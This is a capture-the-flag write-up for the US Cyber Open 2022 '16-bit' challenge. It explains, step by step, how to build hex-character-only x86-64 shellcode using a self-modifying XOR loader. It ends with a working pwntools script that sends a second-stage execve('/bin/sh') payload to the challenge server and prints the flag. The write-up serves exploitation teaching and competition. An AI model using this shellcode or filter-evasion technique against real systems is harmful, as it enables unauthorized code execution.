@@ -1,0 +1,221 @@
+<!--Writeup date: 07/18/2022-->
+
+<h1>US Cyber Open 2022 - 16-bit</h1>
+
+<h2>Writeup by YR81</h2>
+
+<h3>Binary Exploitation</h3>
+
+<h4>Discussion</h4>
+
+<h5>Overview</h5>
+
+<p>Looking at the name of the challenge, I initially thought it would be a challenge for a 16-bit system, such as MS-DOS or similar. But the actual challenge was a to write a shellcode for a 64-bit system using only the bytes <code>0x30 - 0x39</code> and <code>0x41 - 0x46</code>, which is the ASCII character set for representing (uppercase) hexadecimal. The limit on the length of the shellcode itself is 200 bytes. Due to the nature of the allowed character set, the shellcode is read from standard input as a stream of 100 bytes (without restriction), then unpacked such that the representation of the higher nibble in each byte is stored at the lower address, and that of the lower nibble is stored at the higher address. For instance, if the input bytes were <code>12 34 AB CD</code>, then the unpacked result would be <code>31 32 33 34 41 42 43 44</code>.</p>
+
+<h5>Loader Shellcode</h5>
+
+<p>Due to the restriction on allowed bytes and the somewhat stringent length limitation, a standard <code>execve("/bin/sh");</code> shellcode seemed out of reach for the initial payload. The strategy is to submit a <i>loader</i> shellcode that reads in the actual shellcode without input restrictions.</p>
+
+<p>Observing the state of the registers upon jumping to the shellcode (this is libc-dependent), we find that <code>rsi</code> points to beginning of the shellcode region. This is helpful because in the <code>read()</code> syscall, <code>rsi</code> contains the buffer argument. We just need to set <code>rdx</code> to a proper length value, clear <code>rdi</code> so that it references the <code>stdin</code> file descriptor, and clear <code>rax</code> for <code>read()</code> syscall's number, 0. So, a loader shellcode might look something like the following:</p>
+
+<pre class = "asm">
+31 ff                   xor    edi,edi
+ba 31 01 00 00          mov    edx,0x131
+31 c0                   xor    eax,eax
+0f 05                   syscall
+</pre>
+
+<p>While short, this shellcode can clearly not be submitted directly: 8 of the 11 bytes are not in the uppercase hexadecimal range. Therefore, we need to consider using self-modification to produce the "illegal" bytes.</p>
+
+<h5>Survey of Available Instructions</h5>
+
+<p>When writing shellcode with severe input restrictions, it is helpful to survey what instructions are actually available to us. After doing so, we can think about crafting effective self-modifying primitives.</p>
+
+<p>On x64, the bytes <code>0x40 - 0x4f</code> are all register extension (REX) prefixes; that is, they do not actually specify any operation. Their primary use is allowing additional 64-bit registers, namely, <code>r8 - r15</code>, to be used. Thus, for the purposes of collecting available operations, we do not consider these bytes.</p>
+
+<p>Looking to the digit characters, we find that <code>0x37</code> is an invalid opcode, while <code>0x36</code> is a segment override prefix (<code>ss</code>). These will not be useful. Furthermore, <code>0x38</code> and <code>0x39</code> are <code>cmp</code> instructions, which will not be useful either (they only modify the status flags). We are left with <code>0x30 - 0x35</code>, which are <code>xor</code>. Remembering that the input restriction does not only apply to the opcode but also to the <code>mod r/m</code> byte, we are left with a few useful instructions:</p>
+
+<ul>
+    <li>
+        <p><code>34 XX      xor al, XX</code></p>
+        <p>We can XOR <code>al</code> with an immediate byte in the allowed range. Remember that this does not affect the upper 56 bits of the register. Since <code>rax</code> initially points to the shellcode region itself, this is a promising way to jump around the shellcode memory space, given that we can address using <code>rax</code>.</p>
+    </li>
+    <li>
+        <p><code>30 30      xor BYTE PTR [rax], dh</code></p>
+        <p><code>32 30      xor dh, BYTE PTR [rax]</code></p>
+        <p>We can XOR the byte pointed to by <code>rax</code> with <code>dh</code> and vice versa. If we can control the contents of <code>dh</code>, this makes for a powerful self-modifying primitive.</p>
+    </li>
+    <li>
+        <p><code>30 38      xor BYTE PTR [rax], bh</code></p>
+        <p><code>32 38      xor bh, BYTE PTR [rax]</code></p>
+        <p>The same as the previous point, but with <code>bh</code>.</p>
+    </li>
+    <li>
+        <p><code>44 30 30   xor BYTE PTR [rax], r14b</code></p>
+        <p><code>44 32 30   xor r14b, BYTE PTR [rax]</code></p>
+        <p>With the REX prefix <code>44</code>, we can also use <code>r14b</code>...</p>
+    </li>
+    <li>
+        <p><code>44 30 38   xor BYTE PTR [rax], r15b</code></p>
+        <p><code>44 32 38   xor r15b, BYTE PTR [rax]</code></p>
+        <p>... and <code>r15b</code>.</p>
+    </li>
+</ul>
+
+<h5>Restrictions and Required Primitives</h5>
+
+<p>What primitives are at once required for transforming the unallowed bytes in the loader shellcode and accessible by the instructions listed above? First, note that because we only have control over <code>al</code>, we must limit the bytes we wish to modify to be within the first <code>0x100 = 128</code> bytes of the memory space. Because the loader shellcode is relatively short, this seems achievable.</p>
+
+<p>A separate issue is what bytes we can actually produce even with XOR correction. Because XOR is the only instruction we have access to, unless we take advantage of the initial values in byte registers <code>dh</code>, <code>bh</code>, <code>r14b</code>, and <code>r15b</code>, the only bytes we can hope to produce are in the <i>linear span</i> of the set of available input bytes. Note that for all possible upper nibbles, we can produce <i>any</i> lower nibble. This can easily be seen by the fact that <code>0x30 ^ 0x31 = 1</code>, <code>0x30 ^ 0x32 = 2</code>, <code>0x30 ^ 0x34 = 4</code>, and <code>0x30 ^ 0x38 = 8</code>. With <code>1, 2, 4, 8</code>, we span all desired lower nibbles. The upper nibble is more restrictive. For one, we cannot produce any byte greater than <code>0x7f</code>, because this would entail setting the highest bit, which none of the allowable characters have. Furthermore, bytes with upper nibble <code>0x10, 0x20, 0x50, 0x60</code> are also not achievable, because these have differing lowest bits and thus cannot be achieved by XORing <code>0x30</code> and <code>0x40</code>.</p>
+
+<p>There is no easy way to overcome these restrictions on the upper nibble. We use the observation that at the beginning of the shellcode, <code>rdi</code> points to the packed (unmodified) input. Because the packed input does not have restrictions, we are free to use any bytes we wish. Consider including byte <code>0x80</code> at (packed) offset <code>0x41</code>. Then, by invoking the instruction</p>
+
+<pre class = "asm">
+0a 77 41                or     dh,BYTE PTR [rdi+0x41]
+</pre>
+
+<p>we can load <code>0x80</code> into <code>dh</code>, enabling us to manipulate the highest bit. Note that even though this instruction contains illegal bytes, these bytes are all in the linear span of the allowed bytes. We will refer to this instruction as the "dh gadget."</p>
+
+<p>With the highest bit correction in place, our span is increased to everything except bytes with highest nibble <code>0x10, 0x20, 0x50, 0x60, 0x90, 0xa0, 0xd0, 0xe0</code>; i.e., we have access to half the instruction set. Nonetheless, all bytes in the loader shellcode can now be obtained.</p>
+
+<h5>XOR Correction Implementation</h5>
+
+<p>With the primitives in hand, we can implement the shellcode. Taking the loader shellcode with the dh gadget, we can see that everything can be done with the use of just three XOR correctors (excluding the highest bit corrector): <code>0x39, 0x45, 0x35</code>. For example, consider the first illegal byte of the loader, <code>0xff</code>. It can be written as <code>[0x80 ^ 0x39] ^ 0x46</code> (correctors in brackets; recall that <code>0x80</code> is the highest bit corrector). The dh gadget's first illegal byte is <code>0x0a = [0x39] ^ 0x33</code>, while the second is <code>0x77 = [0x45] ^ 0x32</code>. They are summarized below.</p>
+
+<pre class = "asm">
+33[39] 32[45] 41
+;encoded dh gadget
+0a 77 41                or     dh,BYTE PTR [rdi+0x41]
+
+;
+
+31 ff                   xor    edi,edi
+ba 31 01 00 00          mov    edx,0x131
+31 c0                   xor    eax,eax
+0f 05                   syscall
+;encoded loader shellcode
+31 46[80, 39]
+46[80, 39, 45] 31 38[39] 39[39] 39[39]
+31 30[80, 35, 45]
+36[39] 30[35]
+</pre>
+
+<p>Note that illegal bytes in both the dh gadget and the shellcode must be placed in memory that are within the ranges of the span discussed above; otherwise, <code>al</code> cannot be pointed to them. In the below implementation, the dh gadget is stored at <code>0x38 - 0x3b</code>, and the shellcode is stored at <code>0x72 - 0x7d</code>.</p>
+
+<p>The strategy is to load the three corrector bytes into the byte registers, then "walk" the shellcode memory. Jumping from location to location potentially requires up to 3 <code>xor al, XX</code> operations, so we want to correct all the bytes on a single pass.</p>
+
+<h5>Byte Register Initialization</h5>
+
+<p>To initialize the byte register correctors, we need to first retrieve their values from memory. We do not have access to <code>mov</code>. However, <code>xor</code> has a <a href = "https://en.wikipedia.org/wiki/XOR_swap_algorithm" target = "_blank">neat swapping trick</a>. In this way, we simply point <code>rax</code> to the value we want to get, then XOR back and forth. Once the registers are initialized, they can be used without having to revisit the address with which they were swapped.</p>
+
+<h5>Shellcode Implementation</h5>
+
+<pre class = "asm">
+0:  34 38                   xor    al,0x38
+2:  34 45                   xor    al,0x45
+4:  30 38                   xor    BYTE PTR [rax],bh
+6:  32 38                   xor    bh,BYTE PTR [rax]
+8:  34 30                   xor    al,0x30
+a:  34 33                   xor    al,0x33
+c:  44 30 30                xor    BYTE PTR[rax], r14b
+f:  44 32 30                xor    r14b,BYTE PTR [rax]
+12: 34 30                   xor    al,0x30
+14: 34 31                   xor    al,0x31
+16: 44 30 38                xor    BYTE PTR[rax],r15b
+19: 44 32 38                xor    r15b,BYTE PTR [rax]
+
+1c:  34 30                   xor    al,0x30
+1e:  34 31                   xor    al,0x31
+20:  34 46                   xor    al,0x46
+22:  30 38                   xor    BYTE PTR [rax],bh
+24:  34 43                   xor    al,0x43
+26:  30 38                   xor    BYTE PTR [rax],bh
+28:  34 42                   xor    al,0x42
+2a:  44 30 30                xor    BYTE PTR [rax],r14b
+2d:  34 45                   xor    al,0x45
+2f:  44 30 38                xor    BYTE PTR [rax],r15b
+32:  34 38                   xor    al,0x38
+34:  34 32                   xor    al,0x32
+36:  30 38                   xor    BYTE PTR [rax],bh
+
+38: 33[39] 32[45] 41       ;encoded dh gadget
+
+3b:  34 30                   xor    al,0x30
+3d:  34 31                   xor    al,0x31
+3f:  30 38                   xor    BYTE PTR [rax],bh
+41:  34 30                   xor    al,0x30
+43:  34 34                   xor    al,0x34
+45:  30 30                   xor    BYTE PTR [rax],dh
+47:  30 38                   xor    BYTE PTR [rax],bh
+49:  34 30                   xor    al,0x30
+4b:  34 39                   xor    al,0x39
+4d:  30 30                   xor    BYTE PTR [rax],dh
+4f:  44 30 38                xor    BYTE PTR [rax],r15b
+52:  44 30 30                xor    BYTE PTR [rax],r14b
+55:  34 36                   xor    al,0x36
+57:  34 38                   xor    al,0x38
+59:  30 30                   xor    BYTE PTR [rax],dh
+5b:  30 38                   xor    BYTE PTR [rax],bh
+5d:  44 30 30                xor    BYTE PTR [rax],r14b
+60:  34 34                   xor    al,0x34
+62:  34 38                   xor    al,0x38
+64:  30 38                   xor    BYTE PTR [rax],bh
+
+66:  34 30                   xor    al,0x30
+68:  34 30                   xor    al,0x30
+6a:  34 30                   xor    al,0x30
+6c:  34 30                   xor    al,0x30
+6e:  34 30                   xor    al,0x30
+70:  34 30                   xor    al,0x30
+
+72:  31 46[80, 39]			 ;encoded loader shellcode
+74:  46[80, 39, 45] 31 38[39] 39[39] 39[39]
+79:  31 30[80, 35, 45]
+7b:  36[39] 30[35]
+
+7d: 39 45 35                 ;XOR corrector bytes
+80: 30 30                    ;pad out to input offset 0x41
+82: 38 30                    ;'\x80' (literal)
+</pre>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+#p = process("./sixteen")
+'''
+gdb.attach(p, gdbscript = """
+    #b *(encode + 0x14a)
+    b *(main + 0x94)
+""")
+'''
+p = remote("0.cloud.chals.io", 23261)
+
+sc = [b"\x48\x4e\x08\x28\x40\x43\xd0\x0d\x20\x40\x41\xd0\x8d\x28", 
+    b"\x40\x41\x4f\x08\x4c\x08\x4b\xd0\x04\xed\x08\x48\x42\x08", 
+    b"\x32",        #other half next
+    b"\xa4\x04\x10\x84\x04\x40\x00\x84\x04\x90\x0d\x08\xd0\x04\x64\x80\x00\x8d\x00\x44\x48\x08", 
+    b"\x40\x40\x40\x40\x40\x40", 
+    b"\x1f\xf1\x89\x91\x06\x09\xe5\x00\x80"]
+
+sc_ = b"".join(sc)
+assert len(sc_) == 0x42
+
+# submit initial payload
+p.recvline()
+p.send(sc_.ljust(100, b'\x00'))
+
+# submit shellcode
+p.send(
+    0x7d * b'\x90' + 
+    b"\x48\xb8\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd0\x50\x54\x5f\x31\xf6\x31\xd2\x31\xc0\xb0\x3b\x0f\x05"
+)
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>uscg{Nothing_Like_A_Bit_Of_Shellcode_For_The_Week}</code></p>
